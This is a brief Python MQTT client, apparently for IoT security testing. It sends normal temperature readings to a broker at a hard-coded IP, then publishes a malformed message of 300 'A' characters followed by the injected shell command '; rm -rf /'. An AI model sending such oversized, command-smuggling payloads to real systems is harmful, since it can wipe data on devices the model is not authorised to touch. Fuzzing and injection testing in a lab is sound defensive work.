import paho.mqtt.client as mqtt
import time

BROKER = "52.201.6.72"   # <-- Replace with actual AWS IP
PORT = 1883
TOPIC = "sensor/data"

def send_normal_data(client):
    print("[*] Sending normal sensor data...")
    for i in range(5):
        payload = f"temp:{20 + i}C"
        client.publish(TOPIC, payload)
        time.sleep(1)

def send_malformed_payload(client):
    print("[!] Sending malformed payload...")
    malformed = "A" * 300 + "; rm -rf /"
    client.publish(TOPIC, malformed)

def main():
    client = mqtt.Client()
    client.connect(BROKER, PORT, 60)
    send_normal_data(client)
    send_malformed_payload(client)
    client.disconnect()

if __name__ == "__main__":
    main()
